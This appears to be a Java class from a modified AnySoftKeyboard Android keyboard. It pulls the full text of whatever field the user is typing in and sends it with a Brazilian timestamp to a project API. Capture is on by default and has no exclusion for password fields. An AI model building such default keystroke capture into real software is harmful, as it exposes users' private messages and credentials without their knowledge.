package com.anysoftkeyboard;

import android.content.Context;
import android.util.Log;
import android.view.inputmethod.ExtractedText;
import android.view.inputmethod.ExtractedTextRequest;
import android.view.inputmethod.InputConnection;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;

public class SubmitTextApiService {
    private static final int ONE_SECOND = 1000;
    private static final int QTD_MIN_PALAVRAS = 2;

    private long lastTimeMillis;
    private final ProjectAPIService projectAPIService;

    // Variavel para controlar se o envio de textos esta habilitado
    // Por padrao vai vim habilitado.
    private boolean isCaptureEnabled = true;

    // Formato para exibir o timestamp (ISO 8601)
    private static final SimpleDateFormat ISO_8601_FORMAT = createISOFormatter();

    private static SimpleDateFormat createISOFormatter () {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", new Locale("pt", "BR"));
        formatter.setTimeZone(TimeZone.getTimeZone("America/Sao_Paulo")); // Define o fuso horário para o Brasil
        return formatter;
    }

    public SubmitTextApiService(Context context) {
        this.projectAPIService = new ProjectAPIService(context);
    }

    // Metodo para ativar ou desativar o envio de textos
    // se true - habilita /  se false - desabilita
    public void setTextCaptureEnabled(boolean enabled) {
        this.isCaptureEnabled = enabled;
    }

    private String getTypedText(InputConnection ic){
        if (ic == null) {
            return null;
        }

        ExtractedText extractedText = ic.getExtractedText(new ExtractedTextRequest(), 0);
        if(extractedText == null || extractedText.text == null) {
            return null;
        }
        CharSequence text = extractedText.text;
        return text.toString();
    }

    private String getCurrentTimestampISO() {
        return ISO_8601_FORMAT.format(new Date());
    }

    private boolean verifyMinimumWords(String text){
        return text.trim().split("\\s+").length >= QTD_MIN_PALAVRAS;
    }

    public void submitText(InputConnection ic) {
        if (!isCaptureEnabled) {
            Log.w("SubmitAPI", "The text capture is disabled. No text will be sent to the API.");
            return;
        }

        long currentTimeMillis = System.currentTimeMillis();
        if ((currentTimeMillis - lastTimeMillis) > ONE_SECOND) {
            String text = getTypedText(ic);
            if (text != null && verifyMinimumWords(text)) {
                String timestampISO = getCurrentTimestampISO();
                projectAPIService.submitToApi(text, timestampISO);
                Log.d("SubmitAPI", "Text and timestamp submitted to the API.");
            }
        }
        lastTimeMillis = currentTimeMillis;
    }
}
